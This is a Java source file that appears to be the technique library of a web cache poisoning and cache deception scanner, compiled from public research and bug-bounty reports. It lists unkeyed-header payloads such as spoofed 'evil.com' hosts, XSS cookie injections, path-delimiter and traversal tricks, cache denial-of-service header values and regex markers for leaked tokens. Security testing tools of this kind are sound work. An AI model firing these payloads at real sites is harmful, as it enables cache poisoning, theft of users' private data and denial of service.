package cachehunter;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import cachehunter.Technique.Kind;

/**
 * Knowledge base distilled from the supplied research corpus (99 reports/labs/write-ups):
 *  - PortSwigger Research: "Practical Web Cache Poisoning", "Gotta cache 'em all", "Responsible DoS"
 *  - PortSwigger Web Security Academy (poisoning + deception labs)
 *  - HackTricks, PayloadsAllTheThings, OWASP-style AppSec cheat sheet, rodnt notes, bombon methodology
 *  - ~60 HackerOne reports (Shopify, PayPal, GitLab, Mozilla, Cloudflare, Expedia, DoD, GSA, Smule, ...)
 *
 * Every list below is used verbatim by the scanning engine. The Deception tab exposes the
 * extension / delimiter / directory lists for live editing.
 */
public final class TechniqueLibrary {

    private TechniqueLibrary() {}

    // ============================================================================================
    //  UNKEYED / ATTACKER-CONTROLLABLE REQUEST HEADERS  (web cache poisoning)
    //  Frequencies in comments = number of corpus files that mention the header.
    // ============================================================================================

    /** Headers used by back-ends to build absolute URLs / Host — the classic poisoning primitives. */
    public static final List<String> HOST_HEADERS = List.of(
            "X-Forwarded-Host",       // 112 files - #1 primitive (Kettle, HackTricks, almost every H1 report)
            "X-Host",                 // 10
            "X-Forwarded-Server",     // 2  (HubSpot/goodhire canary)
            "X-Forwarded",            // 4
            "Forwarded",              // 32 (RFC 7239: "host=" element)
            "X-Original-Host",
            "X-Real-IP",
            "X-Forwarded-For",        // 10 (often reflected into script src)
            "True-Client-IP",
            "Client-IP",
            "X-Client-IP",
            "X-Custom-IP-Authorization"
    );

    /** Headers that control the scheme used in generated redirects (open-redirect / DoS chains). */
    public static final List<String> SCHEME_HEADERS = List.of(
            "X-Forwarded-Scheme",     // 17 (Rails/Rack) - combine with X-Forwarded-Host
            "X-Forwarded-Proto",      // 5
            "X-Forwarded-Protocol",
            "X-Forwarded-SSL",        // Bitbucket "Contradictory scheme headers" DoS ($1,800)
            "X-Url-Scheme",
            "Front-End-Https"
    );

    /** Port header (invalid port -> timeout/DoS; non-numeric port -> XSS). */
    public static final List<String> PORT_HEADERS = List.of(
            "X-Forwarded-Port"        // 8 (HackerOne X-Forwarded-Port:123 timeout, $2,500)
    );

    /** Routing / URL-override headers (Symfony X-Original-URL / X-Rewrite-URL etc.). */
    public static final List<String> URL_OVERRIDE_HEADERS = List.of(
            "X-Original-URL",         // 10 (Symfony) - Kettle unity.com /admin bypass
            "X-Rewrite-URL",          // 5  (Symfony)
            "X-Override-URL",
            "X-Forwarded-Path",
            "X-Forwarded-Prefix",
            "X-Forwarded-URI",
            "X-Forwarded-URL"
    );

    /** Method-override headers (HEAD -> empty cacheable 200 body; GitLab static DoS). */
    public static final List<String> METHOD_OVERRIDE_HEADERS = List.of(
            "X-HTTP-Method-Override",  // 21
            "X-Method-Override",       // 1
            "X-HTTP-Method"
    );

    /** Cookie parameters commonly reflected / used to select a cached variant. */
    public static final List<String> COOKIE_PARAMS = List.of(
            "language", "locale", "country", "region", "currency",
            "fehost",      // Kettle example: fehost=asd"+alert(1)+"
            "hav",         // Expedia stored-XSS-via-cache report #1760213
            "n_vis",       // bombon: XSS via n_vis cookie ($1,000)
            "session_id",  // Kettle: unkeyed cookie -> per-visitor variant
            "theme", "utm", "ref"
    );

    /** Analytics-style query params typically stripped from the cache key (unkeyed query params). */
    public static final List<String> UNKEYED_QUERY_PARAMS = List.of(
            "utm_content", "utm_source", "utm_medium", "utm_campaign", "utm_term",
            "gclid", "fbclid", "mc_cid", "mc_eid", "callback", "jsonp", "cb", "_"
    );

    // ============================================================================================
    //  CACHE-KEY ORACLE HEADERS  (reveal how the key is built)
    // ============================================================================================
    public static final List<String> CACHE_KEY_ORACLE_PRAGMAS = List.of(
            "akamai-x-get-cache-key",
            "akamai-x-cache-on",
            "akamai-x-cache-remote-on",
            "akamai-x-check-cacheable",
            "akamai-x-get-cache-key, akamai-x-get-extracted-values",
            "akamai-x-get-true-cache-key"
    );

    // ============================================================================================
    //  CACHE INDICATOR HEADERS  (used by CacheAnalyzer to decide cacheable / hit / miss)
    // ============================================================================================
    /** Header names whose presence hints the response passed through a cache. */
    public static final List<String> CACHE_PRESENCE_HEADERS = List.of(
            "X-Cache", "X-Cache-Status", "X-Cache-Hits", "CF-Cache-Status", "X-Proxy-Cache",
            "X-Varnish", "X-Served-By", "Age", "Via", "X-Drupal-Cache", "X-Litespeed-Cache",
            "CDN-Cache-Control", "Cache-Status", "Fastly-Debug-Digest", "X-Iinfo",
            "X-Cache-Lookup", "X-Timer", "X-Akamai-Transformed", "Surrogate-Key", "Surrogate-Control"
    );
    /** Tokens (lower-cased) that indicate a cache HIT when found in cache headers / Server-Timing. */
    public static final List<String> CACHE_HIT_TOKENS = List.of(
            "hit", "cached", "tcp_hit", "tcp_mem_hit", "cdn-cache; desc=hit", "cdn-cache;desc=hit"
    );

    // ============================================================================================
    //  WEB CACHE DECEPTION  - static extensions (CloudFlare/Akamai default cacheable list)
    //  From PayloadsAllTheThings CloudFlare table + Academy + reports (incl. .avif armor bypass).
    // ============================================================================================
    public static final List<String> STATIC_EXTENSIONS = new ArrayList<>(Arrays.asList(
            "css","js","json","xml","txt","map",
            "jpg","jpeg","png","gif","bmp","ico","svg","svgz","webp","avif","tif","tiff","pict",
            "woff","woff2","ttf","otf","eot",
            "mp3","mp4","mid","midi","ogg","flac","avi","mkv","webm","mov","wmv","pls",
            "pdf","doc","docx","xls","xlsx","ppt","pptx","ps","eps","rtf","csv","ejs",
            "zip","gz","gzip","bz2","zst","7z","rar","tar","apk","dmg","iso","bin","jar","class","exe","swf","dll"
    ));

    /** Extensions worth trying first (highest hit-rate) + the CloudFlare armor bypass. */
    public static final List<String> PRIORITY_EXTENSIONS = List.of(
            "js","css","png","jpg","gif","svg","ico","json","txt","pdf","woff2",
            "avif"  // bombon / H1 #1391635 - bypasses CloudFlare "Cache Deception Armor"
    );

    // ============================================================================================
    //  WEB CACHE DECEPTION  - delimiters & path styles
    //  From "Gotta cache 'em all", Academy delimiter labs, HackTricks, PayloadsAllTheThings.
    //  Placeholders:  {B}=base path (no query)  {EXT}=static extension  {RND}=random token  {DIR}=static dir
    // ============================================================================================
    public static final List<String> DECEPTION_DELIMITERS = new ArrayList<>(Arrays.asList(
            // path-mapping (REST): origin ignores the extra segment, cache sees .ext
            "{B}/{RND}.{EXT}",
            "{B}/nonexistent.{EXT}",
            // Rails dot formatter
            "{B}.{EXT}",
            // Spring / Java / Ruby semicolon (matrix params)
            "{B};{RND}.{EXT}",
            "{B};.{EXT}",
            "{B}/{RND};.{EXT}",
            // OpenLiteSpeed encoded null byte
            "{B}%00{RND}.{EXT}",
            "{B}%00.{EXT}",
            // Nginx encoded newline / CR (rewrite path delimiter)
            "{B}%0a{RND}.{EXT}",
            "{B}%0d{RND}.{EXT}",
            // encoded hash (browser won't send raw '#', encoded works)
            "{B}%23{RND}.{EXT}",
            // encoded question mark (cache rules on encoded path, origin decodes)
            "{B}%3f{RND}.{EXT}",
            // encoded tab / semicolon / period
            "{B}%09{RND}.{EXT}",
            "{B}%3b{RND}.{EXT}",
            "{B}%2e{RND}.{EXT}",
            // trailing-slash + query trick
            "{B}/{RND}.{EXT}?{RND}",
            "{B}/;.{EXT}?{RND}"
    ));

    /** Normalization / dot-segment traversal that maps a cacheable dir onto a dynamic path. */
    public static final List<String> DECEPTION_NORMALIZATION = new ArrayList<>(Arrays.asList(
            "/{DIR}/..%2f{B}",
            "/{DIR}/..%2F{B}",
            "/{DIR}/%2e%2e%2f{B}",
            "/{DIR}/..%5c{B}",
            "/{DIR}/..%255c{B}",
            "{B}/..%2f{RND}.{EXT}",
            "/{DIR}%2f..%2f{B}"
    ));

    /** Static directory prefixes that CDNs usually cache wholesale. */
    public static final List<String> STATIC_DIRECTORIES = new ArrayList<>(Arrays.asList(
            "static","assets","resources","public","content","media","images","img",
            "js","css","fonts","dist","build","cdn-cgi","_next","wp-content","sites/files"
    ));

    // ============================================================================================
    //  SENSITIVE MARKERS  - regexes/substrings that flag "this response leaked private data"
    //  (used by the deception detector to confirm a cached response contains victim secrets)
    // ============================================================================================
    public static final List<String> SENSITIVE_MARKERS = new ArrayList<>(Arrays.asList(
            "csrf", "xsrf", "authenticity_token", "csrf-token", "csrf_token",
            "eyJ",                      // JWT header prefix
            "api_key", "apikey", "api-key", "access_token", "auth_token", "bearer",
            "session", "sessionid", "session_id",
            "logout", "sign out", "signout", "my account", "\"email\"", "@",
            "account_id", "user_id", "\"balance\"", "\"token\"", "secret"
    ));

    // ============================================================================================
    //  CPDoS  - cacheable-error primitives (HHO / HMC / HMO)  from "Responsible DoS" + reports.
    //  Each entry: {headerName, headerValue}. A cache-buster is always added so PoCs are safe.
    // ============================================================================================
    public static final String[][] DOS_HEADER_PRIMITIVES = new String[][] {
            // HMC - HTTP Meta Character (illegal chars -> 400)
            {"X-Metachar-Oversize", "\\"},                 // Akamai backslash 400 (bombon $1,000)
            {"X-Amz-Website-Redirect-Location", "\\"},
            // bad Transfer-Encoding -> 501 / error (PayPal $9,700, Bitbucket)
            {"Transfer-Encoding", "cow"},
            {"Transfer-Encoding", "chunkedX"},
            // bad Range -> 400 (Twitter abs.twimg.com)
            {"Range", "bytes=cow"},
            {"Range", "bytes=99999999999-"},
            // Accept-Encoding brotli force / underscore key-miss (Instagram $1,000)
            {"Accept-Encoding", "br"},
            {"Accept_Encoding", "br"},                     // underscore variant misses the cache key
            // invalid Accept -> 406/400
            {"Accept", "cow/cow"},
            // scheme contradiction (Bitbucket)
            {"X-Forwarded-SSL", "off"},
            // hop-by-hop abuse
            {"Max-Forwards", "0"},
            {"Upgrade", "websocket"},
            // content-type poisoning of error state (GitHub repo DoS)
            {"Content-Type", "invalid-value"}
            // NOTE: method-override + X-Forwarded-Port primitives are applied via the dedicated
            // METHOD_OVERRIDE_HEADERS and PORT_HEADERS loops in Scanners.scanDos().
    };

    /** Query/path DoS payloads (NULL bytes, param arrays, oversize) - Greenhouse reports. */
    public static final List<String> DOS_QUERY_PRIMITIVES = new ArrayList<>(Arrays.asList(
            "{RND}=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00",   // NULL bytes (H1 #334709)
            "for%5B%5D=1&for%5B%5D=2&for%5B%5D=3&for%5B%5D=4&for%5B%5D=5",  // param arrays (H1 #326639)
            "{RND}=" + "A".repeat(4096)                                 // oversize value
    ));

    /** Oversized header used for the HHO (Header Oversize) CPDoS class. */
    public static final int HHO_HEADER_SIZE = 8192;

    // ============================================================================================
    //  Build the full Technique catalogue for the read-only "Techniques DB" viewer.
    // ============================================================================================
    public static List<Technique> catalogue() {
        List<Technique> t = new ArrayList<>();
        String kettle = "PortSwigger Research (Kettle)";
        String academy = "PortSwigger Web Security Academy";
        String h1 = "HackerOne reports";
        String ht = "HackTricks / PayloadsAllTheThings";

        for (String h : HOST_HEADERS)
            t.add(new Technique(Kind.UNKEYED_HEADER, "Host spoofing", h,
                    h + ": <token>.evil.com",
                    "Reflected into redirects, canonical links, og:image/og:url, or script src. Poison if unkeyed + cacheable.",
                    kettle));
        for (String h : SCHEME_HEADERS)
            t.add(new Technique(Kind.UNKEYED_HEADER, "Scheme override", h,
                    h + ": nothttps",
                    "Controls scheme of generated redirect; chain with X-Forwarded-Host for open redirect / DoS.",
                    kettle));
        for (String h : PORT_HEADERS)
            t.add(new Technique(Kind.UNKEYED_HEADER, "Port injection", h,
                    h + ": 1",
                    "Invalid port poisons redirects to a dud port (DoS); non-numeric port can inject XSS.",
                    h1));
        for (String h : URL_OVERRIDE_HEADERS)
            t.add(new Technique(Kind.UNKEYED_HEADER, "URL override", h,
                    h + ": /admin",
                    "Symfony/framework routing override; can reach internal paths and be cached.",
                    kettle));
        for (String h : METHOD_OVERRIDE_HEADERS)
            t.add(new Technique(Kind.UNKEYED_HEADER, "Method override", h,
                    h + ": HEAD",
                    "Overriding GET->HEAD yields a cacheable 200 with empty body (static-asset DoS).",
                    ht));
        for (String c : COOKIE_PARAMS)
            t.add(new Technique(Kind.UNKEYED_COOKIE, "Unkeyed cookie", c,
                    "Cookie: " + c + "=<token>\"><script>alert(1)</script>",
                    "Cookie reflected/used to pick a cached variant; if unkeyed the response can be poisoned.",
                    academy));

        t.add(new Technique(Kind.FAT_GET, "Fat GET", "Fat GET body override",
                "GET /x?p=safe  +  body: p=payload",
                "Cache keys on URL param, origin uses body param (James Kettle, GitHub).", kettle));
        t.add(new Technique(Kind.PARAM_CLOAKING, "Parameter cloaking", "Duplicate ? delimiter",
                "/?p=1?excluded=payload", "Cache sees two params & drops the 2nd; origin sees one long value.", kettle));
        t.add(new Technique(Kind.PARAM_CLOAKING, "Parameter cloaking", "Semicolon cloaking (Rails)",
                "/?keyed=abc&excluded=1;keyed=payload", "Rails splits on ';' and takes the last duplicate.", kettle));
        for (String p : UNKEYED_QUERY_PARAMS)
            t.add(new Technique(Kind.UNKEYED_PARAM, "Unkeyed query param", p,
                    "?" + p + "=<token>", "Analytics-style param often excluded from the cache key.", academy));

        for (String[] d : DOS_HEADER_PRIMITIVES)
            t.add(new Technique(Kind.DOS, "CPDoS (header)", d[0],
                    d[0] + ": " + d[1], "Elicits a cacheable error/empty response (safe with cache-buster).",
                    "Responsible DoS (Kettle) / " + h1));
        for (String q : DOS_QUERY_PRIMITIVES)
            t.add(new Technique(Kind.DOS, "CPDoS (query)", "query primitive",
                    "?" + q.replace("{RND}", "junk"), "NULL bytes / param arrays / oversize -> cacheable 400.", h1));

        t.add(new Technique(Kind.UNKEYED_HEADER, "Cache-key injection", "Unkeyed port (Host)",
                "Host: host:31337", "Arbitrary port reflected in generated URL while the cache key ignores the port.", h1));
        t.add(new Technique(Kind.UNKEYED_HEADER, "Cache-key oracle", "Akamai Pragma",
                "Pragma: akamai-x-get-cache-key", "Reveals the exact cache key in X-Cache-Key (aids exploitation).", kettle));
        t.add(new Technique(Kind.DOS, "Cache maintenance", "PURGE method",
                "PURGE /path", "If honoured, flushes cache entries -> on-demand re-poisoning.", ht));
        t.add(new Technique(Kind.UNKEYED_PARAM, "Cache-key injection", "Encoded duplicate param",
                "?p=v&p%65=0", "URL-encoded duplicate of a keyed param -> cacheable 400 (Fastly siz%65).", ht));

        for (String d : DECEPTION_DELIMITERS)
            t.add(new Technique(Kind.DECEPTION_PATH, "Deception - delimiter/extension", d,
                    d, "Origin ignores suffix, cache stores response as static (private data leak).",
                    "Gotta cache 'em all / " + academy));
        for (String d : DECEPTION_NORMALIZATION)
            t.add(new Technique(Kind.DECEPTION_PATH, "Deception - normalization", d,
                    d, "Dot-segment/traversal maps a cacheable dir onto a dynamic response.",
                    "Gotta cache 'em all / " + academy));
        return t;
    }
}
